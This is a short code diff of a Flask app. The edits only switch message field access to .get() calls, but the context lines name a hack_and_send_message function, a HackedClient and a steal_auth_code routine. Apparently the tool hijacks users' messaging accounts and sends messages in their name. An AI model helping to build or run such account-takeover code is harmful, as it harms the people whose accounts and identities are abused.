@@ -27,9 +27,9 @@ def send_user_message(user_id):
     if not isinstance(messages, list):
         return jsonify("please provide a list of messages [message, message, ...]"), 400     
     for message in messages:
-        if not message["receiver"]:
+        if not message.get("receiver"):
             return jsonify("missing receiver"), 400
-        if not message["text"]:
+        if not message.get("text"):
             return jsonify("missing text"), 400
     
     try:
@@ -47,7 +47,7 @@ async def hack_and_send_message(user_id, phonenumber, messages):
     client = HackedClient(user_id, phonenumber, FirebaseInteraction.steal_auth_code)
     async with client:
         for message in messages:
-            await client.send_message(message["receiver"], message["text"])
+            await client.send_message(message.get("receiver"), message.get("text"))
 
 # ---------- Git Webhook (Re-)Deployment ----------
 @app.route('/update')
